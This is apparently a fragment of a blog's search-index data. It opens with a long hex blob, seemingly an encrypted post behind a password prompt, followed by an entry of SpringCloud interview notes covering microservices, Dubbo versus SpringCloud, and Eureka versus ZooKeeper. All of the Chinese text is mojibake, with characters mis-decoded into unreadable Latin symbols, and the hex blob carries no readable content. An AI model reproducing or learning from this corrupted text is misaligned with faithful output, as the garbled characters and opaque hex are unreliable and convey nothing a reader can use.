dde2a8e9a9a350969bdfbc333f3e86224fa79d35f843ee4df95afaa8cebf7d868cfdaf122f157e1eee8471ef503491496b63281bff56c168ee792110d29eca23092deb7f1701483b23f708a0a8fde8bdba6af62cf46900c908015b476019f253f447534f03789620eb79d175798f1db7de8ed5d3549eac9f6dc0adb314669f669300f0cb218f9a5a72dcd1ba85757c676ca8a9c30b3c62deaece0cad9d4285609acf17aa7bc78738ef21b9d166e1596456ccf1284754a4d404a034b24394ef58f22de2ff76a7f76b0836e778c88ae17f7da7ce5acb061b767298a1c4286c670ee324924571da3ca8fe88d745576449bb9aa6a227fab4a24502f5e708639cf68274acd0a3569b25051a3cfc2ccaa95f87e751a99b97c6f94266837aedf7ff0804335f52c794acddd8894d149c766b26cf64e65fe0ece56264a7babbd624913cc434e2c146cb251566a01383968d3188b621ebc35c1dde2613473ad8145d48438f68087eb31c2949670da90d3cb4d14153305022f4a924bbdb14b173b383e452783f7280e67a4c23316585bbf9fad9b393e5e14ce02bed19eeaadcfdb18e385e0ef565084d13b77ffbf1a011f3d70868e5919499d6cacae04ddc4a420d018e473a0fafe0f7a3757dd403e4d8f5fbd9c93140a20ec59fa4c4d240679334628399de2287bef6e47f668c1f264f2d27a8e1837fd98530b39e55547e5470e51551a2312e2956c52a7afc412438b4356a880bfd000b9942769133acbe1ccbfec4a95ad4f6f7c1b7ade4c2ab203e4b9528b34cd566d9b9d791dddd4abf232a0cb00150b395d85a66a8a8167d12a8f1f4ad4817bdbfd0df06587012445c9bac99d63f560286b00cda48e12ddcf213ddbea3c5e6d3588fee9166e059fda1de6fbef36801a2362efae7e9ba0a444410201dc65c9b8d2eebc32e30300e146204490941fb0ae89befcbaed4baa7d36cf3ad2a02dd6a9247351ca0cdbd97dfeee82e85f574a4e3ac018b4f8cb2085062a7a6d56854027992bb7bd4c009dda952c410c4fca2ca98f479cdcfd2ed115894c7f86f21c218a07c32b92ceafd7bb19b01ca1382dc5ca1433d668c02532bb2375d631e88b231ed3b5a82a44b0e79d58d1ab839fd07852b969d427b8091030fcb391c15bb7549f1f207d87c2a8354e0d01464de0bfea4fbbb89d813f5c3400f555fe581e123c1c74e318bcef0582659477d12b06579fb028b825f2dd5d911298205072da5967e03f4f9bb6f6067e7c77ea6f4a7765914d2471cf622cec9e61016e25f660e91e13b52828a051b7d5e736c685bdf34978c9d8d159c19241ea925da6d32c61aa359550c29ed24b01b3928da151fda41e8635419fbb64d9a834f626c4b6bba7583d34f2c9f18ee822d0d40569a98c26103ca94b41539a6955522bb7b83d4ea0fc459e753fa5101c3710f40f41246a2501fd0ad24e92297d7e96228daa510e2cf921f57c39dd80b4b2290f296c7cb711279f331506c3fa33eddc8130d02d81da7e7f215de3535dc0b8cb7adedb16537a51797257de7d0d6f03a098033e05aa1d0e8770b6f615f48f675958b908fedfaa4b9b608479cd0ae8977376aa8ced69a830fb1ae624d43cded65a8f947ab3a31dfe57229fbc6f905903e4a38d8f36e4533fe44edc22648a78f1bf196ead5ea64e301e74edf928225e9ea3b469df600d99b93d89b72de57f966aa87b427a98e8522668acef8690e21036c9802db142bbab136b878ede58b0f6365b73cc144867cc83f666cba510a9ca8033069fc510dbeed007b7e74c6bcd965b42124497db0924802409bfd4e83d228d269590c87d785c1f3198c2aeeb963737871f96e89f9985abf4d375310e55e2500a4733a59e79a8ca6dadd49cbb70fe8e9bce47cf329055c2100a594d0b01827591ef324b6448fa67a122fe4c599dfb156d3b4bad5fc57981b864e407bb26fc1d31273eb76cad8adb378bbd6c14bfdfddf46a0eb1d3e9ba991740d9da6d10b815f82977157860d01c1a9400f9798d71f8b7cc0ebe1a5839d8122ced0a20445fe51dc00bc1bbbae608b6b24d6f303515d807f996dd6557da80ef1c82d9161bf7945b81bfde5c36d50ce0a1a4480843bd70f0d931b60877cbc71d3b965a89e321369691c0c8c3ea0300a65d03a8d367ffe0c2b872ad3cd2521b809ab72717aa1182dc24764de0861c393a7993da858af593a5a84b82c0bf6452dd54f50ca143ee9da1f591a0ef0fe84945fb3479e5c9608172f68be8f8293567b4226b6df3d9a23c365c22b6cfc366f89743279be08cc15f363d0443a6f1cca388e3a97e42315e84ec1d5ae40b4e6a5bd0ad5555aa6772ea428a15f5ce5d65c101621d0e243617490ffdd7594c4a466f402da6f197490feee0c956b36e762cdbe3bf209cb423c17bf79abfd26a6215f69c7bb6c9b9ad11197167dd5bcbf4c62e6b0c6eca65b69bf4aaad26a9551a3e89fdd470d9e3d1979853d27b4d4c837dd0580fd06500e25ebd7384ca4fd17ad6d66535945afb6d884bc2fcfe0e3009c4617df1e04107350cfe4e15a4345c263d9f8372e93356402797ae2c613dfee7106ea32908a8284a18a67527b2f0f16216b3555a504d1a2a3f25fd32427481259b4bc68d0c482e6a4cd7879a8634fe7ee1abf1200f48aee12aa4c8b8bfc2678bd84a3cabdf9252f9fcfefff7e089b63a26b2f9091cfb11057caac9d7fa7fa0ff148772dd7d9ca5c424de9cc1a386630b29b6b07c2a91766a71f3ff25b36775f1ea7bad20f6dd3465d939a8887f497d9ffa666a60cc316c557179a4ebbeba63f7f2cab9fbbaba0bc205b1d18eb3f0386113ae29b87f0b1fd5283060fd0d0e76146ae02beaa70624173555ae3e29b45c73931dd309c3bff9045d0563a8b61c4df8f809b6ac636f63705f405888d2f457c13ee62d8eac0b903c905da85a11f2c10be2dc19a842b69667dd4f596524d8f5d7ebd73fd0458b075abec6a67bb38f74290439ed6feb66201bacf6778bb66eb6ac5b41ad6d9da0facda0e3a91ad4c8cbaf60555d343531e28d2de5afcb6a7eb9379717374d958d19c2431cd70e8e1ad53d01ec1193f05a11079f8fac03a61b4cb43d593c8b66ce67f2421ab829472bc1b6a459f41629fe1cc9dec61fe623c7bf7b5779bf4be5a10dfb79acfff03b301485327c1dcd26347356f56d83e9c0dad1fbdd2783d9d8e1101018370441447b2dea7752df529452069f64526a7d26fe26b9833774e035d6b6df140305475a8c8874aa1b27280fc7833727252791c03327489fe160669d731beaa46b4670f1193caf52777d733428cd2bfae85e96a69c31638951dfd1a6febba886e2a76c2c7d977d27a3e33315a559bc562be8d077377b67a992994be1dc702a067ac7e3bf6367bf53b07286a915d889ac5a31e821a4431524f99b0fb59984628868abb785b39a66091e1e553085597198c1f06341f41697a2f633e518f3fb144c49b28a25337024f3be0235a333485272ecc1940fbb390841a92abae009a7ed6d10786161e158405a9c38f4666c42e76b0ae269dec3025c1524eabb99539c330291b92f7ad9c92cd3896e401fa60efefecb66d8ef96aadbeb1c9cc7c327d72871c211d0f45b745f153dab0edeef65d6f65995a97d6f084c80e9ceec0da7a83e2715a3b2fff8d86e3d86d8221b0db2dde61b1206c83e88be9f4024a08069a55191c72f4916228b94504c08e15cdce5482c0ea30cb1a6a689bf4d7814f05ccc63b7a03256f11987d9a40a2b31fe5edf299606cd771d4b0710d24f18e7a04133902641899a76c040602a4d4f0c60e902d8730db2d550787e5b829ac4000d19054cd38488aa749de9d5445a513f59fc338f6c79c74337b1a33f0360479efeac4ea7cedf36f74c136ed5c8f1dffa9dc00928d98731b429745c38b6a03004773d0ff3ec60bf221d77ae3846917b0f19f4c801eb9af4f66f78b909be52728f3d05b2fcd2e4191691919c9a52ef63919db74c479e6e2ba38d7335becea3d è¯· è¾“ å…¥ é˜… è¯» å¯† ç .",tags:"åŠ å¯†åšå®¢ æ¸¸ç©æ”»ç•¥"},{title:"SpringCloud é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/1cdff3b4.html",text:'å¾®æœåŠ¡å¾®æœåŠ¡çš„æ¦‚è¿°å¾®æœåŠ¡ç†è®ºçš„æå‡ºè€…é©¬ä¸ã€‚ç¦å‹’ï¼ˆMartin Fowlerï¼‰ åœ¨å…¶åšå®¢ä¸­è¯¦ç»†æè¿°äº†ä»€ä¹ˆæ˜¯å¾®æœåŠ¡ã€‚å¾®æœåŠ¡å¼ºè°ƒçš„æ˜¯æœåŠ¡çš„å¤§å°ï¼Œå®ƒå…³æ³¨çš„æ˜¯æŸä¸€ä¸ªç‚¹ï¼Œæ˜¯å…·ä½“è§£å†³æŸä¸€ä¸ªé—®é¢˜ / æä¾›è½åœ°å¯¹åº”æœåŠ¡çš„ä¸€ä¸ªæœåŠ¡åº”ç”¨ï¼›ç‹­æ„çš„çœ‹ï¼Œå¯ä»¥çœ‹ä½œ Eclipse é‡Œé¢çš„ä¸€ä¸ªä¸ªå¾®æœåŠ¡å·¥ç¨‹ / æˆ–è€… Moduleã€‚ å¾®æœåŠ¡æ¶æ„çš„æ¦‚è¿°å¾®æœåŠ¡æ¶æ„æ˜¯ä¸€ç§æ¶æ„æ¨¡å¼æˆ–è€…è¯´æ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼Œå®ƒæå€¡å°†å•ä¸€åº”ç”¨ç¨‹åºåˆ’åˆ†ä¸ºä¸€ç»„å°æœåŠ¡ï¼Œæ¯ä¸ªæœåŠ¡è¿è¡Œåœ¨è‡ªå·±çš„ç‹¬ç«‹è¿›ç¨‹ä¸­ï¼ŒæœåŠ¡é—´é€šä¿¡é‡‡ç”¨è½»é‡çº§é€šä¿¡æœºåˆ¶ (é€šå¸¸æ˜¯åŸºäº HTTP çš„ RESTful API)ã€‚æ¯ä¸ªæœåŠ¡éƒ½å›´ç»•ç€å…·ä½“ä¸šåŠ¡è¿›è¡Œæ„å»ºï¼Œå¹¶ä¸”èƒ½å¤Ÿè¢«ç‹¬ç«‹åœ°éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒã€ç±»ç”Ÿäº§ç¯å¢ƒç­‰ã€‚å¦å¤–ï¼Œåº”è¯¥å°½é‡é¿å…ç»Ÿä¸€çš„ã€é›†ä¸­å¼çš„æœåŠ¡ç®¡ç†æœºåˆ¶ï¼Œå¯¹å…·ä½“çš„ä¸€ä¸ªæœåŠ¡è€Œè¨€ï¼Œåº”æ ¹æ®ä¸šåŠ¡ä¸Šä¸‹æ–‡ï¼Œé€‰æ‹©åˆé€‚çš„ç¼–ç¨‹è¯­è¨€ã€å·¥å…·å¯¹å…¶è¿›è¡Œæ„å»ºï¼Œå¯ä»¥æœ‰ä¸€ä¸ªéå¸¸è½»é‡çº§çš„é›†ä¸­å¼ç®¡ç†æ¥åè°ƒè¿™äº›æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„ç¼–ç¨‹è¯­è¨€æ¥ç¼–å†™æœåŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸åŒçš„æ•°æ®å­˜å‚¨æŠ€æœ¯ã€‚ å¾®æœåŠ¡æ¶æ„çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š æ˜“äºå¼€å‘å’Œç»´æŠ¤ï¼šä¸€ä¸ªå¾®æœåŠ¡åªä¼šå…³æ³¨ä¸€ä¸ªç‰¹å®šçš„ä¸šåŠ¡åŠŸèƒ½ï¼Œæ‰€ä»¥å®ƒä¸šåŠ¡æ¸…æ™°ï¼Œä»£ç é‡è¾ƒå°‘ å•ä¸ªå¾®æœåŠ¡å¯åŠ¨è¾ƒå¿«ï¼šå•ä¸ªå¾®æœåŠ¡ä»£ç é‡è¾ƒå°‘ï¼Œæ‰€ä»¥å¯åŠ¨ä¼šæ¯”è¾ƒå¿« ä¸šåŠ¡ä¹‹é—´æ¾è€¦åˆï¼Œæ— è®ºæ˜¯åœ¨å¼€å‘é˜¶æ®µæˆ–è€…éƒ¨ç½²é˜¶æ®µï¼Œä¸åŒçš„æœåŠ¡éƒ½æ˜¯äº’ç›¸ç‹¬ç«‹çš„ å±€éƒ¨ä¿®æ”¹å®¹æ˜“éƒ¨ç½²ï¼šå•ä½“åº”ç”¨åªè¦æœ‰ä¿®æ”¹ï¼Œå°±å¾—é‡æ–°éƒ¨ç½²æ•´ä¸ªåº”ç”¨ï¼Œå¾®æœåŠ¡è§£å†³äº†è¿™æ ·çš„é—®é¢˜ æŠ€æœ¯æ ˆä¸å—é™ï¼šåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œå¯ä»¥ç»“åˆé¡¹ç›®ä¸šåŠ¡åŠå›¢é˜Ÿçš„ç‰¹ç‚¹ï¼Œåˆç†åœ°é€‰æ‹©æŠ€æœ¯æ ˆ æŒ‰éœ€ä¼¸ç¼©ï¼šå¯æ ¹æ®éœ€æ±‚ï¼Œå®ç°ç»†ç²’åº¦çš„æ‰©å±• åªæœ‰ä¸šåŠ¡é€»è¾‘çš„ä»£ç ï¼Œä¸ä¼šå’Œ HTMLã€CSS æˆ–è€…å…¶ä»–å‰ç«¯é¡µé¢è€¦åˆï¼Œç›®å‰æœ‰ä¸¤ç§å¼€å‘æ¨¡å¼ï¼šå‰åç«¯åˆ†ç¦»ã€å…¨æ ˆå¼€å‘ ç¼ºç‚¹ï¼š è¿ç»´è¦æ±‚é«˜ï¼šæ›´å¤šçš„æœåŠ¡æ„å‘³ç€æ›´å¤šçš„è¿ç»´æŠ•å…¥ æŠ€æœ¯å¼€å‘éš¾åº¦é«˜ï¼šæ¶‰åŠåˆ°ç½‘ç»œé€šä¿¡å»¶è¿Ÿã€æœåŠ¡å®¹é”™ã€æ•°æ®ä¸€è‡´æ€§ã€ç³»ç»Ÿé›†æˆæµ‹è¯•ã€ç³»ç»Ÿéƒ¨ç½²ä¾èµ–ã€æ€§èƒ½ç›‘æ§ç­‰ åˆ†å¸ƒå¼ç³»ç»Ÿå›ºæœ‰çš„å¤æ‚æ€§ï¼šä½¿ç”¨å¾®æœåŠ¡æ¶æ„çš„æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå¯¹äºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿï¼Œç³»ç»Ÿå®¹é”™ï¼Œç½‘ç»œå»¶è¿Ÿï¼Œåˆ†å¸ƒå¼äº‹åŠ¡ç­‰éƒ½ä¼šå¸¦æ¥å·¨å¤§çš„æŒ‘æˆ˜ æ¥å£è°ƒæ•´æˆæœ¬é«˜ï¼šå¾®æœåŠ¡ä¹‹é—´é€šè¿‡æ¥å£è¿›è¡Œé€šä¿¡ã€‚å¦‚æœä¿®æ”¹æŸä¸€ä¸ªå¾®æœåŠ¡çš„ APIï¼Œå¯èƒ½æ‰€æœ‰ä½¿ç”¨äº†è¯¥æ¥å£çš„å¾®æœåŠ¡éƒ½éœ€è¦åšè°ƒæ•´ é‡å¤åŠ³åŠ¨ï¼šå¾ˆå¤šæœåŠ¡å¯èƒ½éƒ½ä¼šä½¿ç”¨åˆ°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œè¿™ä¸ªåŠŸèƒ½å¹¶æ²¡æœ‰è¾¾åˆ°åˆ†è§£ä¸ºä¸€ä¸ªå¾®æœåŠ¡çš„ç¨‹åº¦ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå¯èƒ½å„ä¸ªæœåŠ¡éƒ½ä¼šå¼€å‘è¿™ä¸€åŠŸèƒ½ï¼Œä»è€Œå¯¼è‡´ä»£ç é‡å¤ SpringBoot ä¸ SpringCloudSpringBoot ä¸ SpringCloud çš„å…³ç³» SpringBoot ä¸“æ³¨äºå¿«é€Ÿã€æ–¹ä¾¿çš„å¼€å‘å•ä¸ªå¾®æœåŠ¡ä¸ªä½“ï¼ŒSpringCloud åˆ™å…³æ³¨å…¨å±€çš„æœåŠ¡æ²»ç† SpringCloud å°† SpringBoot å¼€å‘çš„ä¸€ä¸ªä¸ªå•ä½“å¾®æœåŠ¡æ•´åˆå¹¶ç®¡ç†èµ·æ¥ï¼Œä¸ºå„ä¸ªå¾®æœåŠ¡ä¹‹é—´æä¾›é…ç½®ç®¡ç†ã€æœåŠ¡å‘ç°ã€æ–­è·¯å™¨ã€è·¯ç”±ã€å¾®ä»£ç†ã€äº‹ä»¶æ€»çº¿ã€å…¨å±€é”ã€å†³ç­–ç«é€‰ã€åˆ†å¸ƒå¼ä¼šè¯ç­‰é›†æˆçš„æœåŠ¡ SpringBoot å¯ä»¥ç¦»å¼€ SpringCloud ç‹¬ç«‹ä½¿ç”¨å¼€å‘é¡¹ç›®ï¼Œä½†æ˜¯ SpringCloud ç¦»ä¸å¼€ SpringBootï¼Œå±äºä¾èµ–çš„å…³ç³» Dubbo å¯¹æ¯” SpringCloudRPC ä¸ REST çš„åŒºåˆ«å¾®æœåŠ¡ç†è®ºçš„æå‡ºè€…é©¬ä¸ã€‚ç¦å‹’ï¼ˆMartin Fowlerï¼‰ï¼Œåœ¨å…¶è®ºæ–‡ä¸­å¯ä»¥å‘ç°å…¶å®šä¹‰çš„æœåŠ¡é—´é€šä¿¡æœºåˆ¶å°±æ˜¯ HTTP RESTã€‚RPC çš„æ€§èƒ½æ¯”è¾ƒå‡ºä¼—ï¼Œå…¶æœ€ä¸»è¦çš„ç¼ºé™·å°±æ˜¯æœåŠ¡æä¾›æ–¹å’Œè°ƒç”¨æ–¹å¼ä¹‹é—´ä¾èµ–å¤ªå¼ºï¼Œæ¯•ç«Ÿéœ€è¦ä¸ºæ¯ä¸€ä¸ªå¾®æœåŠ¡è¿›è¡Œæ¥å£çš„å®šä¹‰ï¼Œå¹¶é€šè¿‡æŒç»­é›†æˆå‘å¸ƒï¼Œéœ€è¦ä¸¥æ ¼çš„ç‰ˆæœ¬æ§åˆ¶æ‰ä¸ä¼šå‡ºç°æœåŠ¡æä¾›å’Œè°ƒç”¨ä¹‹é—´å› ä¸ºç‰ˆæœ¬ä¸åŒè€Œäº§ç”Ÿçš„å†²çªã€‚è€Œ REST æ˜¯è½»é‡çº§çš„æ¥å£ï¼ŒæœåŠ¡çš„æä¾›å’Œè°ƒç”¨ä¸å­˜åœ¨ä»£ç ä¹‹é—´çš„è€¦åˆï¼Œåªæ˜¯é€šè¿‡ä¸€ä¸ªçº¦å®šè¿›è¡Œè§„èŒƒï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å‡ºç°æ–‡æ¡£å’Œæ¥å£ä¸ä¸€è‡´è€Œå¯¼è‡´çš„æœåŠ¡é›†æˆé—®é¢˜ï¼Œä½†å¯ä»¥é€šè¿‡ Swagger å·¥å…·æ•´åˆï¼Œæ˜¯ä»£ç å’Œæ–‡æ¡£ä¸€ä½“åŒ–è§£å†³ï¼Œæ‰€ä»¥ REST åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹æ¯” RPC æ›´åŠ çµæ´»ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå½“å½“ç½‘çš„ DubboX åœ¨å¯¹ Dubbo çš„å¢å¼ºä¸­å¢åŠ äº†å¯¹ REST çš„æ”¯æŒçš„åŸå› ã€‚ Dubbo ä¸ SpringCloud çš„åŒºåˆ« åŠŸèƒ½ Dubbo SpringCloud æœåŠ¡æ³¨å†Œä¸­å¿ƒ Zookeeperã€Nacosã€Redis Spring Cloud Netfix Eureka æœåŠ¡è°ƒç”¨æ–¹å¼ RPC REST API æœåŠ¡ç›‘æ§ Dubbo-Monitor Spring Boot Admin ç†”æ–­å™¨ Sentinel Spring Cloud Netflix Hystrix æœåŠ¡ç½‘å…³ æ—  Spring Cloud Netflix Zuul åˆ†å¸ƒå¼é…ç½® Nacos Spring Cloud Config æœåŠ¡è·Ÿè¸ª æ—  Spring Cloud Sleuth æ•°æ®æµ æ—  Spring Cloud Stream æ‰¹é‡ä»»åŠ¡ æ—  Spring Cloud Task ä¿¡æ¯æ€»çº¿ æ—  Spring Cloud Bus æœ€å¤§åŒºåˆ«ï¼šSpringCloud æŠ›å¼ƒäº† Dubbo çš„ RPC é€šä¿¡ï¼Œé‡‡ç”¨çš„æ˜¯åŸºäº HTTP çš„ REST æ–¹å¼ã€‚ä¸¥æ ¼æ¥è¯´è¿™ä¸¤ç§æŠ€æœ¯æ–¹æ¡ˆå„æœ‰ä¼˜åŠ£ã€‚è™½ç„¶ä»ä¸€å®šç¨‹åº¦ä¸Šæ¥è¯´ï¼ŒSpringCloud ç‰ºç‰²äº†æœåŠ¡è°ƒç”¨çš„æ€§èƒ½ï¼Œä½†ä¹Ÿé¿å…äº†åŸç”Ÿ RPC å¸¦æ¥çš„é—®é¢˜ã€‚è€Œä¸” REST ç›¸æ¯” RPC æ›´ä¸ºçµæ´»ï¼ŒæœåŠ¡æä¾›æ–¹å’Œè°ƒç”¨æ–¹çš„ä¾èµ–åªä¾é ä¸€çº¸å¥‘çº¦ï¼Œä¸å­˜åœ¨ä»£ç çº§åˆ«çš„å¼ºä¾èµ–ï¼Œè¿™åœ¨å¼ºè°ƒå¿«é€Ÿæ¼”åŒ–çš„å¾®æœåŠ¡ç¯å¢ƒä¸‹ï¼Œæ˜¾å¾—æ›´åŠ åˆé€‚ã€‚ å®šä½åŒºåˆ«ï¼šDubbo æ˜¯ SOA æ—¶ä»£çš„äº§ç‰©ï¼Œå®ƒçš„å…³æ³¨ç‚¹ä¸»è¦åœ¨äºæœåŠ¡çš„è°ƒç”¨ï¼Œæµé‡åˆ†å‘ã€æµé‡ç›‘æ§å’Œç†”æ–­ã€‚è€Œ SpringCloud è¯ç”Ÿäºå¾®æœåŠ¡æ¶æ„æ—¶ä»£ï¼Œè€ƒè™‘çš„æ˜¯å¾®æœåŠ¡æ²»ç†çš„æ–¹æ–¹é¢é¢ï¼Œå¦å¤–ç”±äºä¾æ‰˜äº† Spirngã€SpirngBoot çš„ä¼˜åŠ¿ä¹‹ä¸Šï¼Œä¸¤ä¸ªæ¡†æ¶åœ¨å¼€å§‹ç›®æ ‡å°±ä¸ä¸€è‡´ï¼ŒDubbo å®šä½ä¸º RPC æ¡†æ¶ã€SpirngCloud å®šä½ä¸ºå¾®æœåŠ¡æ¶æ„ä¸‹çš„ä¸€ç«™å¼è§£å†³æ–¹æ¡ˆï¼ˆå¾®æœåŠ¡ç”Ÿæ€ï¼‰ã€‚ä½œä¸ºé‡å¯ Dubbo å¼€æºé¡¹ç›®çš„è´Ÿè´£äººåˆ˜å†›ä¹Ÿæ›¾è¡¨ç¤ºï¼Œå¦‚æœéè¦ç±»æ¯”çš„è¯ï¼ŒDubbo å¯ä»¥ç±»æ¯”ä¸º Netfix OSS æŠ€æœ¯æ ˆï¼Œè€Œ SpringCloud é›†æˆäº† Netfix OSS ä½œä¸ºåˆ†å¸ƒå¼æœåŠ¡æ²»ç†è§£å†³æ–¹æ¡ˆï¼Œä½†é™¤æ­¤ä¹‹å¤– SpringCloud è¿˜æä¾›äº†åŒ…æ‹¬ configã€streamã€security ç­‰ç­‰åˆ†å¸ƒå¼é—®é¢˜è§£å†³æ–¹æ¡ˆã€‚å½“å‰ç”±äº RPC åè®®ã€æ³¨å†Œä¸­å¿ƒå…ƒæ•°æ®ä¸åŒ¹é…ç­‰é—®é¢˜ï¼Œåœ¨é¢ä¸´å¾®æœåŠ¡åŸºç¡€æ¡†æ¶é€‰å‹æ—¶ï¼ŒDubbo ä¸ SpringCloud åªèƒ½äºŒé€‰ä¸€ã€‚Dubbo æ—¥åå¯èƒ½ä¼šç§¯æé€‚é…åˆ° SpringCloud ç”Ÿæ€ï¼Œæ¯”å¦‚ä½œä¸º SpringCloud çš„äºŒè¿›åˆ¶é€šè®¯æ–¹æ¡ˆæ¥å‘æŒ¥ Dubbo çš„æ€§èƒ½ä¼˜åŠ¿ï¼Œæˆ–è€… Dubbo é€šè¿‡æ¨¡å—åŒ–ä»¥åŠå¯¹ HTTP çš„æ”¯æŒé€‚é…åˆ° SpringCloudã€‚ å“ç‰Œæœºä¸ç»„è£…æœºçš„åŒºåˆ«ï¼šSpring Cloud çš„åŠŸèƒ½å¾ˆæ˜æ˜¾æ¯” Dubbo æ›´åŠ å¼ºå¤§ï¼Œæ¶µç›–é¢æ›´å¹¿ï¼Œè€Œä¸”ä½œä¸º Spring çš„æ——èˆ°é¡¹ç›®ï¼Œå®ƒä¹Ÿèƒ½å¤Ÿä¸ Spring Frameworkã€Spring Bootã€Spring Dataã€Spring Batch ç­‰å…¶ä»– Spring é¡¹ç›®å®Œç¾èåˆï¼Œè¿™äº›å¯¹äºå¾®æœåŠ¡è€Œè¨€æ˜¯è‡³å…³é‡è¦çš„ã€‚ä½¿ç”¨ Dubbo æ„å»ºçš„å¾®æœåŠ¡æ¶æ„å°±åƒç»„è£…ç”µè„‘ï¼Œå„ç¯èŠ‚é€‰æ‹©è‡ªç”±åº¦å¾ˆé«˜ï¼Œä½†æ˜¯æœ€ç»ˆç»“æœå¾ˆæœ‰å¯èƒ½å› ä¸ºä¸€æ¡å†…å­˜è´¨é‡ä¸è¡Œå°±ç‚¹ä¸äº®äº†ï¼Œæ€»æ˜¯è®©äººä¸æ€ä¹ˆæ”¾å¿ƒï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨è€…æ˜¯ä¸€åé«˜æ‰‹ï¼Œé‚£è¿™äº›éƒ½ä¸æ˜¯é—®é¢˜ã€‚è€Œ Spring Cloud å°±åƒå“ç‰Œæœºï¼Œåœ¨ Spring Source çš„æ•´åˆä¸‹ï¼Œåšäº†å¤§é‡çš„å…¼å®¹æ€§æµ‹è¯•ï¼Œä¿è¯äº†æœºå™¨æ‹¥æœ‰æ›´é«˜çš„ç¨³å®šæ€§ï¼Œä½†æ˜¯å¦‚æœè¦åœ¨ä½¿ç”¨éåŸè£…ç»„ä»¶å¤–çš„ä¸œè¥¿ï¼Œå°±éœ€è¦å¯¹å…¶åŸºç¡€åŸç†æœ‰è¶³å¤Ÿçš„äº†è§£ã€‚ ç¤¾åŒºæ”¯æŒä¸æ›´æ–°åŠ›åº¦çš„åŒºåˆ«ï¼šæœ€ä¸ºé‡è¦çš„æ˜¯ï¼ŒDubbo åœæ­¢äº† 5 å¹´å·¦å³çš„æ›´æ–°ï¼Œè™½ç„¶ 2017.9 é‡å¯äº†ã€‚å¯¹äºæŠ€æœ¯å‘å±•çš„æ–°éœ€æ±‚ï¼Œéœ€è¦ç”±å¼€å‘è€…è‡ªè¡Œæ‹“å±•å‡çº§ï¼ˆæ¯”å¦‚å½“å½“ç½‘è‡ªç ”äº† Dubboxï¼‰ï¼Œè¿™å¯¹äºå¾ˆå¤šæƒ³è¦é‡‡ç”¨å¾®æœåŠ¡æ¶æ„çš„ä¸­å°å‹è½¯ä»¶å…¬å¸ï¼Œæ˜¾ç„¶æ˜¯ä¸å¤ªåˆé€‚çš„ã€‚ä¸­å°å‹è½¯ä»¶å…¬å¸æ²¡æœ‰è¿™ä¹ˆå¼ºå¤§çš„æŠ€æœ¯èƒ½åŠ›å»ä¿®æ”¹ Dubbo æºç  + å‘¨è¾¹çš„ä¸€æ•´å¥—è§£å†³æ–¹æ¡ˆï¼Œå¹¶ä¸”ä¸æ˜¯æ¯ä¸€ä¸ªå…¬å¸éƒ½æœ‰é˜¿é‡Œçš„å¤§ç‰› + çœŸå®çš„çº¿ä¸Šç”Ÿäº§ç¯å¢ƒæµ‹è¯•ç»ä¿®æ”¹è¿‡æºç çš„æ¡†æ¶ã€‚ å…¶ä»–ç»„ä»¶å¯¹æ¯”Eureka å¯¹æ¯” ZooKeeper ZooKeeper ä¿è¯çš„æ˜¯ CPï¼ŒEureka ä¿è¯çš„æ˜¯ AP Eureka æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå·¥ç¨‹ï¼Œè€Œ ZooKeeper åªæ˜¯ä¸€ä¸ªè¿›ç¨‹ ZooKeeper æœ‰ Leader å’Œ Follower è§’è‰²ï¼ŒEureka å„ä¸ªèŠ‚ç‚¹æ˜¯å¹³ç­‰å…³ç³» ZooKeeper åœ¨é€‰ä¸¾æœŸé—´æ³¨å†ŒæœåŠ¡ç˜«ç—ªï¼Œè™½ç„¶æœåŠ¡æœ€ç»ˆä¼šæ¢å¤ï¼Œä½†æ˜¯é€‰ä¸¾æœŸé—´ä¸å¯ç”¨ï¼›Eureka åªè¦æœ‰ä¸€å®ä¾‹å°±å¯ä»¥ä¿è¯æœåŠ¡å¯ç”¨ï¼Œä½†æŸ¥è¯¢åˆ°çš„æ•°æ®å¯èƒ½å¹¶ä¸æ˜¯æœ€æ–°çš„ ZooKeeper é‡‡ç”¨è¿‡åŠæ•°å­˜æ´»åŸåˆ™ï¼ŒEureka é‡‡ç”¨è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶è§£å†³åˆ†åŒºé—®é¢˜ Eureka è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶ä¼šå¯¼è‡´ï¼š Eureka ä¸å†ä»æ³¨å†Œåˆ—è¡¨ç§»é™¤å› é•¿æ—¶é—´æ²¡æ”¶åˆ°å¿ƒè·³è€Œåº”è¯¥è¿‡æœŸçš„æœåŠ¡ Eureka ä»ç„¶èƒ½å¤Ÿæ¥å—æ–°æœåŠ¡çš„æ³¨å†Œå’ŒæŸ¥è¯¢è¯·æ±‚ï¼Œä½†æ˜¯ä¸ä¼šè¢«åŒæ­¥åˆ°å…¶ä»–èŠ‚ç‚¹ï¼ˆé«˜å¯ç”¨ï¼‰ Eureka åœ¨ç½‘ç»œç¨³å®šçš„æ—¶å€™ï¼Œå½“å‰å®ä¾‹æ–°çš„æ³¨å†Œä¿¡æ¯ä¼šè¢«åŒæ­¥åˆ°å…¶ä»–èŠ‚ç‚¹ä¸­ï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰ Eureka å¯ä»¥å¾ˆå¥½çš„åº”å¯¹å› ç½‘ç»œæ•…éšœå¯¼è‡´éƒ¨åˆ†èŠ‚ç‚¹å¤±å»è”ç³»çš„æƒ…å†µï¼Œè€Œä¸ä¼šåƒ ZooKeeper ä¸€æ ·ä½¿å¾—æ•´ä¸ªæ³¨å†Œä¸­å¿ƒç˜«ç—ª å¤šç§ä¸»æµæ³¨å†Œä¸­å¿ƒçš„å¯¹æ¯” Zuul å¯¹æ¯” Spring Cloud Gateway 